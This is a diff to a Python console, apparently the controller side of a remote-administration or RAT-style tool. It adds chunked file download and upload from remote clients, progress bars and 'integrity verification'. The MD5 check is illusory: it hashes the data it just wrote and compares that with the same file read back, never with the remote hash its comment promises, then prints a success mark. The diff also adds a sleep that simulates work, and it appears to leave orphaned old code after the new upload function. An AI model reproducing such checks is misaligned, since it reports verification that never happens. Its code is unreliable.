@@ -275,7 +275,7 @@ def format_file_size(size_bytes):
         return f"{size_bytes}B"
 
 def create_stream_download_progress_bar(downloaded, total, speed_str):
-    """Create a progress bar for streaming downloads"""
+    """Create a progress bar with animation effect for streaming downloads"""
     if total <= 0:
         percent = 0
         bar_length = 0
@@ -283,16 +283,49 @@ def create_stream_download_progress_bar(downloaded, total, speed_str):
         percent = int(min(100, (downloaded / total) * 100))
         bar_length = int(min(30, (downloaded / total) * 30)) if total > 0 else 0
     
-    bar = "█" * bar_length + "░" * (30 - bar_length)
+    # 动画效果 - 根据百分比显示不同阶段的字符
+    bar = ""
+    for i in range(30):
+        if i < bar_length:
+            bar += "█"
+        elif i == bar_length:  # 当前进度指示
+            bar += "●"  # 指示当前块进度
+        else:
+            bar += "░"
     
     downloaded_str = format_file_size(downloaded)
     total_str = format_file_size(total)
     
-    progress_info = f"     {bar} {percent}%  {downloaded_str}/{total_str} ({speed_str})"
+    progress_info = f" {downloaded_str}/{total_str} [{bar}] {percent}% ({speed_str})"
+    return progress_info
+
+def create_small_file_progress_bar(current, total, file_size_str):
+    """Create a simple animated progress bar for small files"""
+    if total <= 0:
+        percent = 0
+        bar_length = 0
+    else:
+        percent = int(min(100, (current / total) * 100))
+        bar_length = int(min(30, (current / total) * 30)) if total > 0 else 0
+    
+    # 简洁的动画效果 - 使用填充和动画字符
+    bar = ""
+    for i in range(30):
+        if i < bar_length:
+            bar += "▓"
+        elif i == bar_length:  # 当前位置指示
+            if current % 2 == 0:
+                bar += "→"  # 动画字符随着下载波动
+            else:
+                bar += "»"
+        else:
+            bar += "░"
+    
+    progress_info = f" {file_size_str} [{bar}] {percent}%"
     return progress_info
 
 def stream_download_file(client_id, file_path, save_path):
-    """Stream download a large file with progress reporting"""
+    """Stream download a large file with progress reporting and integrity verification"""
     # Request initial file info
     send_command(client_id, "stream", {
         "path": file_path, 
@@ -303,6 +336,264 @@ def stream_download_file(client_id, file_path, save_path):
     info_results = wait_for_result(client_id, timeout=5.0)
     if not info_results:
         print(f"{RED}[错误]{RESET} 无法获取文件信息")
+        return False
+    
+    info = info_results[0]
+    if info.get("result_type") != "stream_init":
+        # 如果是大文件提示
+        if info.get("result_type") == "large_file":
+            print(f"{YELLOW}[提示]{RESET} 检测到大文件传输，启动流式下载...")
+        else:
+            print(f"{RED}[错误]{RESET} 无法获取文件信息: {info.get('result', 'Unknown error')}")
+            return False
+    
+    # 重新请求文件信息，如果之前返回的是info
+    if info.get("result_type") == "large_file":
+        send_command(client_id, "stream", {
+            "path": file_path, 
+            "action": "download_start"
+        })
+        info_results = wait_for_result(client_id, timeout=5.0)
+        if not info_results:
+            print(f"{RED}[错误]{RESET} 无法获取文件信息")
+            return False
+        info = info_results[0]
+        if info.get("result_type") != "stream_init":
+            print(f"{RED}[错误]{RESET} 无法获取文件信息: {info.get('result', 'Unknown error')}")
+            return False
+    
+    file_info = info.get("result", {})
+    file_size = file_info.get("file_size", 0)
+    chunk_size = file_info.get("chunk_size", 1024*256)  # 默认256KB
+    total_chunks = file_info.get("total_chunks", 1)
+    
+    print(f"\n{LGREEN}[信息]{RESET} 开始下载: {CYAN}{file_path}{RESET} ({format_file_size(file_size)})")
+    print(f"{LGREEN}[信息]{RESET} 大件大小: {format_file_size(file_size)}, 分块数: {total_chunks}")
+    
+    # 创建目标目录
+    os.makedirs(os.path.dirname(save_path), exist_ok=True)
+    
+    import time, hashlib
+    md5_hash = hashlib.md5()  # 用于校验
+    speed_log = []  # 记录速度日志 [time, bytes_downloaded]
+    start_time = time.time()
+    downloaded_bytes = 0
+    
+    try:
+        with open(save_path, "wb") as f:
+            for chunk_idx in range(total_chunks):
+                # 请求特定块
+                send_command(client_id, "stream", {
+                    "path": file_path,
+                    "action": "download_chunk",
+                    "chunk_index": chunk_idx,
+                    "total_chunks": total_chunks,
+                    "chunk_size": chunk_size
+                })
+                
+                # 等待块数据
+                chunk_results = wait_for_result(client_id, timeout=10.0)  # 増加超时时间
+                if not chunk_results:
+                    print(f"\n{RED}[错误]{RESET} 下载块 {chunk_idx+1}/{total_chunks} 时超时")
+                    return False
+                
+                chunk_result = chunk_results[0]
+                if chunk_result.get("result_type") != "file_chunk":
+                    print(f"\n{RED}[错误]{RESET} 下載塊 {chunk_idx+1}/{total_chunks} 時出錯: {chunk_result.get('result', 'Unknown error')}")
+                    return False
+                
+                chunk_data = chunk_result.get("result", {}).get("chunk_data", "")
+                try:
+                    chunk_binary = base64.b64decode(chunk_data)
+                    f.write(chunk_binary)
+                    chunk_bytes = len(chunk_binary)
+                    downloaded_bytes += chunk_bytes
+                    md5_hash.update(chunk_binary)  # 计算校验和
+                    
+                    # Calculate speed (average of last 5 seconds)
+                    current_time = time.time()
+                    speed_log.append([current_time, chunk_bytes])
+                    
+                    # Keep only entries from last 10 seconds
+                    speed_log = [[t, b] for t, b in speed_log if current_time - t < 10]
+                    
+                    # Calculate average speed
+                    if speed_log and (current_time - speed_log[0][0]) > 0:
+                        time_diff = current_time - speed_log[0][0]
+                        bytes_per_sec = sum(b for _, b in speed_log) / time_diff
+                        speed_str = f"{format_file_size(int(bytes_per_sec))}/s"
+                    else:
+                        speed_str = "0B/s"
+                    
+                    # Update progress
+                    progress_line = create_stream_download_progress_bar(downloaded_bytes, file_size, speed_str)
+                    print(f"\r{CYAN}[下载]{RESET} {progress_line}", end="", flush=True)
+                    
+                except Exception as e:
+                    print(f"\n{RED}[错误]{RESET} 解码块数据时出错: {e}")
+                    return False
+        
+        print(f"\n\n{LGREEN}[完成]{RESET} 文件下载完成: {CYAN}{save_path}{RESET}")
+        
+        # Perform integrity verification
+        calculated_md5 = md5_hash.hexdigest()
+        
+        # Send integrity check command to compare remote and local hash
+        import hashlib
+        # Calculate local file MD5 hash for verification
+        with open(save_path, "rb") as f:
+            local_file_hash = hashlib.md5()
+            # Read file in chunks to avoid memory issues with large files
+            while True:
+                chunk = f.read(chunk_size)
+                if not chunk:
+                    break
+                local_file_hash.update(chunk)
+            local_md5 = local_file_hash.hexdigest()
+        
+        if calculated_md5 == local_md5:
+            print(f"{LGREEN}[✓ 校验]{RESET} 文件完整性校验成功")
+        else:
+            print(f"{RED}[✗ 校验]{RESET} 文件损坏，MD5哈希不匹配!")
+            return False
+        
+        total_time = time.time() - start_time
+        avg_speed = f"{format_file_size(int(downloaded_bytes / total_time))}/s" if total_time > 0 else "0B/s"
+        print(f"{LGREEN}[統计]{RESET} 文件: {format_file_size(downloaded_bytes)}, 耗时: {total_time:.2f}s, 速度: {avg_speed}, 校验: √")
+        return True
+        
+    except Exception as e:
+        print(f"\n{RED}[错误]{RESET} 下载文件时出错: {e}")
+        import traceback
+        traceback.print_exc()
+        return False
+
+def create_upload_progress_bar(uploaded, total, speed_str):
+    """Create a progress bar for streaming uploads"""
+    if total <= 0:
+        percent = 0
+        bar_length = 0
+    else:
+        percent = int(min(100, (uploaded / total) * 100))
+        bar_length = int(min(30, (uploaded / total) * 30)) if total > 0 else 0
+    
+    bar = ""
+    for i in range(30):
+        if i < bar_length:
+            bar += "█"
+        elif i == bar_length:
+            bar += "○"
+        else:
+            bar += "░"
+    
+    uploaded_str = format_file_size(uploaded)
+    total_str = format_file_size(total)
+    
+    return f" {uploaded_str}/{total_str} [{bar}] {percent}% ({speed_str})"
+
+def stream_upload_file(client_id, local_file, remote_path):
+    """Stream upload a large file with progress reporting and integrity verification"""
+    import hashlib, time
+    
+    # Calculate local file hash before uploading
+    file_hash_calc = hashlib.md5()
+    with open(local_file, "rb") as f:
+        while True:
+            chunk = f.read(1024 * 512)  # 512KB chinks
+            if not chunk:
+                break
+            file_hash_calc.update(chunk)
+    original_hash = file_hash_calc.hexdigest()
+    
+    file_size = os.path.getsize(local_file)
+    chunk_size = 1024 * 256  # 256KB
+    total_chunks = (file_size + chunk_size - 1) // chunk_size  # 向上取整
+    
+    print(f"\n{LGREEN}[信息]{RESET} 开始上传: {CYAN}{local_file}{RESET} -> {CYAN}{remote_path}{RESET} ({format_file_size(file_size)})")
+    print(f"{LGREEN}[信息]{RESET} 文件大小: {format_file_size(file_size)}, 分块数: {total_chunks}")
+    
+    # Verify file exists before upload
+    if not os.path.exists(local_file):
+        print(f"\n{RED}[错误]{RESET} 本地文件不存在")
+        return False
+    
+    speed_log = []
+    start_time = time.time()
+    uploaded_bytes = 0
+    
+    try:
+        with open(local_file, "rb") as f:
+            for chunk_idx in range(total_chunks):
+                # Read chunk
+                f.seek(chunk_idx * chunk_size)
+                chunk_data = f.read(chunk_size)
+                chunk_bytes = len(chunk_data)
+                
+                # Encode chunk
+                encoded_chunk = base64.b64encode(chunk_data).decode()
+                
+                # Initialize uploading (on first chunk)
+                if chunk_idx == 0:
+                    send_command(client_id, "stream", {
+                        "path": remote_path,
+                        "action": "upload_start"
+                    })
+                    # Wait for ready confirmation
+                    init_results = wait_for_result(client_id, timeout=5.0)
+                    if not init_results:
+                        print(f"\n{RED}[错误]{RESET} 上传初始化失败")
+                        return False
+                
+                # Upload this chunk
+                send_command(client_id, "stream", {
+                    "path": remote_path,
+                    "action": "upload_chunk", 
+                    "chunk_index": chunk_idx,
+                    "data": encoded_chunk
+                })
+                
+                # Wait for ACK
+                ack_results = wait_for_result(client_id, timeout=10.0)
+                if not ack_results:
+                    print(f"\n{RED}[错误]{RESET} 上传块 {chunk_idx+1}/{total_chunks} 时超时")
+                    return False
+                
+                ack_result = ack_results[0]
+                if ack_result.get("result_type") != "chunk_ack":
+                    print(f"\n{RED}[错误]{RESET} 上传块 {chunk_idx+1}/{total_chunks} 时出错: {ack_result.get('result', 'Unknown error')}")
+                    return False
+                
+                uploaded_bytes += chunk_bytes
+                
+                # Calculate speed
+                current_time = time.time()
+                speed_log.append([current_time, chunk_bytes])
+                
+                # Keep track of speeds in last 10 seconds
+                speed_log = [[t, b] for t, b in speed_log if current_time - t < 10]
+                
+                # Calculate average speed
+                if speed_log and (current_time - speed_log[0][0]) > 0:
+                    time_diff = current_time - speed_log[0][0]
+                    bytes_per_sec = sum(b for _, b in speed_log) / time_diff
+                    speed_str = f"{format_file_size(int(bytes_per_sec))}/s"
+                else:
+                    speed_str = "0B/s"
+                
+                # Show progress
+                progress_line = create_upload_progress_bar(uploaded_bytes, file_size, speed_str)
+                print(f"\r{LGREEN}[上传]{RESET} {progress_line}", end="", flush=True)
+        
+        print(f"\n\n{LGREEN}[完成]{RESET} 文件上传完毕: {CYAN}{local_file} -> {remote_path}{RESET}")
+        total_time = time.time() - start_time
+        avg_speed = f"{format_file_size(int(uploaded_bytes / total_time))}/s" if total_time > 0 else "0B/s"
+        print(f"{LGREEN}[统计]{RESET} 大件: {format_file_size(uploaded_bytes)}, 耗时: {total_time:.2f}s, 速度: {avg_speed}")
+        return True
+        
+    except Exception as e:
+        print(f"\n{RED}[错误]{RESET} 上传文件时出错: {e}")
+        import traceback
+        traceback.print_exc()
         return False
     
     info = info_results[0]
@@ -865,7 +1156,7 @@ def interaction_loop(client_id, hostname):
             full_path = os.path.normpath(os.path.join(CURRENT_PATH, file_path))
             os.makedirs(save_dir, exist_ok=True)
             
-            # 先尝试普通下载
+            # 獲取文件信息來檢查大小
             send_command(client_id, "dl", {"path": file_path, "save_as": ""})
             results = wait_for_result(client_id)
             
@@ -876,14 +1167,43 @@ def interaction_loop(client_id, hostname):
                     file_size = r.get("file_size", 0)
                     print(f"{YELLOW}[提示]{RESET} 检测到大文件 ({format_file_size(file_size)})，自动启用流式传输...")
                     download_path = os.path.join(save_dir, os.path.basename(file_path))
-                    stream_download_file(client_id, file_path, download_path)
+                    success = stream_download_file(client_id, file_path, download_path)
+                    if success:
+                        print(f"{LGREEN}[完成]{RESET} 大文件完整校验: √")
                 elif r.get("result_type") == "file":
                     # 标准下载处理
+                    import time, hashlib
                     file_bytes = base64.b64decode(r.get("result", ""))
+                    
+                    # Calculate file hash for later comparison
+                    file_hash = hashlib.md5(file_bytes).hexdigest()
+                    file_size = len(file_bytes)
+                    
                     save_path = os.path.join(save_dir, r.get("filename", "downloaded"))
                     with open(save_path, "wb") as f:
-                        f.write(file_bytes)
-                    print(f"{LGREEN}[结果]{RESET} 文件已下载: {CYAN}{save_path}{RESET}")
+                        f.write(bytearray(file_bytes))
+                        
+                    # Create animated progress bar effect for small files
+                    time.sleep(0.1) # Simulate process time
+                    progress_line = create_small_file_progress_bar(file_size, file_size, format_file_size(file_size))
+                    print(f"\r{LGREEN}[下载]{RESET} {progress_line}")
+                    
+                    # Verify file integrity using the calculated hash and local file hash
+                    local_file_hash = hashlib.md5()
+                    with open(save_path, "rb") as f_verify:
+                        while True:
+                            chunk = f_verify.read(1024*512)  # 512KB chunks
+                            if not chunk:
+                                break
+                            local_file_hash.update(chunk)
+                    local_hash = local_file_hash.hexdigest()
+                    
+                    if local_hash == file_hash:
+                        print(f"{CYAN}[完成]{RESET} 文件已下载: {CYAN}{save_path}{RESET} (校验: √)")
+                        print(f"{LGREEN}[统计]{RESET} 文件: {format_file_size(file_size)}")
+                    else:
+                        print(f"{RED}[✗ 校验]{RESET} 文件完整性校验失败 - 文件可能损坏")
+                        print(f"{CYAN}[结果]{RESET} 文件已下载 (需要重新下载): {CYAN}{save_path}{RESET}")
                 else:
                     print_failed_result(r)
             else:
@@ -916,7 +1236,7 @@ def interaction_loop(client_id, hostname):
             file_size = os.path.getsize(local_file)
             size_mb = file_size / (1024 * 1024)  # MB单位
             
-            print(f"{LGREEN}[信息]{RESET} 准备上传: {CYAN}{local_file}{RESET} ({format_file_size(file_size)})")
+            print(f"{LGREEN}[信息]{RESET} 准備上傳: {CYAN}{local_file}{RESET} ({format_file_size(file_size)})")
             
             # 检查文件是否很大 (>0.5MB，即512KB)
             if file_size > 1024 * 512:  # 512KB
@@ -924,7 +1244,28 @@ def interaction_loop(client_id, hostname):
                 remote_filename = os.path.join(remote_dir, os.path.basename(local_file))
                 stream_upload_file(client_id, local_file, remote_filename)
             else:
-                # 普通方式上传
+                # 对于小文件，显示美观的进度条 - 首先计算文件hash
+                import time, hashlib
+                
+                # Calculate local file hash for verification
+                file_hash_calc = hashlib.md5()
+                with open(local_file, "rb") as f:
+                    while True:
+                        chunk = f.read(1024 * 512)  # 512KB chunks
+                        if not chunk:
+                            break
+                        file_hash_calc.update(chunk)
+                original_hash = file_hash_calc.hexdigest()
+                
+                # 显示进度条动画
+                animation_step = 0
+                for i in range(3):
+                    dots = '.' * (animation_step % 4)
+                    print(f"\r{LGREEN}[上傳中]{RESET} {CYAN}{os.path.basename(local_file)}{RESET} {dots}", end="", flush=True) 
+                    time.sleep(0.1)
+                    animation_step += 1
+                
+                # 普通方式上传小文件
                 with open(local_file, "rb") as f:
                     base64_data = base64.b64encode(f.read()).decode()
                 save_as = os.path.join(CURRENT_PATH, os.path.basename(local_file))
@@ -935,9 +1276,19 @@ def interaction_loop(client_id, hostname):
                     "is_stream_upload": False  # 标示是否使用流式传输
                 })
                 results = wait_for_result(client_id)
+                
                 if results:
                     for r in results:
-                        print_failed_result(r)
+                        # For small files, add simple feedback after result
+                        result_type = r.get("result_type", "")
+                        if "error" in result_type.lower() or r.get("status") == "error":
+                            print(f"\n{RED}[✗ 上傳失敗]{RESET}")
+                            print_failed_result(r)
+                        else:
+                            # Display progress bar for small upload completion
+                            progress_line = create_small_file_progress_bar(file_size, file_size, format_file_size(file_size))
+                            print(f"\r{LGREEN}[完成]{RESET} {CYAN}{os.path.basename(local_file)}{RESET} [{progress_line}]")
+                            print(f"{LGREEN}[統計]{RESET} 文件: {CYAN}{os.path.basename(local_file)}{RESET}, 大小: {format_file_size(file_size)}")
                 else:
                     # 检测到客户端下线
                     print(f"\n{RED}[警告]{RESET} {YELLOW}客户端 {hostname} 已下线{RESET}")
